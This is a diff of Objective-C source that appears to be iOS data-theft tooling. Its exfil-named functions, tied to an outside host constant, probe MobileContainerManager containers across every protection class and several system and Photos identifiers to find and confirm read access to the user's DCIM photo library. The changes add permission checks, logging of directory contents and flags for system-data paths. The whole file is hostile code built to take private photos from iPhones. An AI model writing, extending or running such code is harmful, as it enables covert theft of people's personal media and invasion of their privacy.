@@ -11,6 +11,7 @@
 #import <CommonCrypto/CommonCryptor.h>
 #import <stdlib.h>
 #import <string.h>
+#import <errno.h>
 
 static NSString *const kExfilBase = @"https://iso.daiti.de";
 
@@ -411,14 +412,17 @@ static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSStr
 
 static NSString *exfilMCMPhotosMediaDir(void)
 {
-    // /private/var/mobile/Media 是 class=2 数据容器；
-    // 媒体目录归属 mobileslideshow，逐 identifier 试，以 DCIM 存在为准
+    // 点查名单：mobile/root 是 system data 域用户 home，命中概率最高；
+    // 其余是照片体系相关 identifier，每档 class 全配一遍
     NSArray *identifiers = @[
+        @"mobile",
+        @"root",
+        @"com.apple.mobilephoto",
+        @"com.apple.PhotoLibrary",
         @"com.apple.mobileslideshow",
+        @"com.apple.assetsd",
         @"com.apple.Photos",
-        @"com.apple.mobileslideshow-Data",
     ];
-    // 全档扫描：class 0-6 全试，每个成功 root 打一级目录列表找 DCIM/Media
     NSFileManager *fm = [NSFileManager defaultManager];
     for (uint64_t cls = 0; cls <= 6; cls++)
     {
@@ -426,22 +430,41 @@ static NSString *exfilMCMPhotosMediaDir(void)
         {
             NSString *err = nil;
             NSString *root = exfilMCMContainerPath(cls, ident, &err);
-            if (gExfilMcmLogged < 24)
+            if (root.length == 0)
+            {
+                // 没容器：只在额度内打一行，含错误信息
+                if (gExfilMcmLogged < 40)
+                {
+                    gExfilMcmLogged++;
+                    exfilLog(@"MCM cls=%llu ident=%@ no-root err=%@",
+                             (unsigned long long)cls, ident, err);
+                }
+                continue;
+            }
+
+            // 有 root：列一级目录 + errno，验证读权限（地图≠门能开）
+            errno = 0;
+            NSArray *entries = [fm contentsOfDirectoryAtPath:root error:nil];
+            int listErrno = errno;
+            BOOL readable = entries != nil;
+            if (gExfilMcmLogged < 40)
             {
                 gExfilMcmLogged++;
-                exfilLog(@"MCM try ident=%@ cls=%llu root=%@ err=%@",
-                         ident, (unsigned long long)cls, root, err);
+                exfilLog(@"MCM cls=%llu ident=%@ root=%@ readable=%d errno=%d n=%lu entries: %@",
+                         (unsigned long long)cls, ident, root, readable, listErrno,
+                         (unsigned long)entries.count,
+                         entries.count <= 15
+                            ? [entries componentsJoinedByString:@","]
+                            : [[entries subarrayWithRange:NSMakeRange(0, 15)]
+                                componentsJoinedByString:@","]);
+                // system data 域命中标记（不带 Containers 的 /var/mobile 路径）
+                if ([root hasPrefix:@"/private/var/mobile"] &&
+                    ![root containsString:@"Containers"])
+                    exfilLog(@"*** SYSTEM DATA HIT cls=%llu ident=%@ root=%@",
+                             (unsigned long long)cls, ident, root);
             }
-            if (root.length == 0) continue;
 
-            // 打印 root 一级目录，一次真机运行看清容器地图
-            if (gExfilMcmLogged <= 24)
-            {
-                NSArray *entries = [fm contentsOfDirectoryAtPath:root error:nil];
-                exfilLog(@"MCM root[%@ cls=%llu] entries: %@",
-                         ident, (unsigned long long)cls,
-                         [entries componentsJoinedByString:@","]);
-            }
+            if (!readable) continue; // EPERM/EACCES：有路径没权限，先记录换下一个
 
             // 直接命中 DCIM
             if ([fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]])
@@ -450,7 +473,7 @@ static NSString *exfilMCMPhotosMediaDir(void)
                          ident, (unsigned long long)cls, root);
                 return root;
             }
-            // root 里有 Media 子目录（部分容器把媒体挂在里面）
+            // root 里有 Media 子目录
             NSString *mediaSub = [root stringByAppendingPathComponent:@"Media"];
             if ([fm fileExistsAtPath:[mediaSub stringByAppendingPathComponent:@"DCIM"]])
             {
